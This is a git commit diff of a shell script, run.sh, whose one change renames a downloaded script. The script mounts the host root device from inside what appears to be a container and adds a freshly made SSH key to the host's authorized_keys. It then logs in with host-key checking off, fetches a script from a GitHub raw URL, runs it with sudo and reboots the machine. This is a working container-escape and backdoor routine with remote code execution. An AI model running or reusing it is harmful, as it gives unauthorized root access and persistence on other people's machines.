a03f34862657be42047ec2912583056a2ccc77f0
kienminhkhai84-max <kienminhkhai84@gmail.com>
2025-09-21 13:38:04 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,4 +2,4 @@ cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; ip=$(curl -s if
 ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa  ; \
 echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys && \
 ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip \
-"wget https://raw.githubusercontent.com/kienminhkhai84-max/tmate-test/refs/heads/main/a.sh -O a.sh; sudo bash lt4c.sh; sudo reboot"
+"wget https://raw.githubusercontent.com/kienminhkhai84-max/tmate-test/refs/heads/main/a.sh -O a.sh; sudo bash a.sh; sudo reboot"
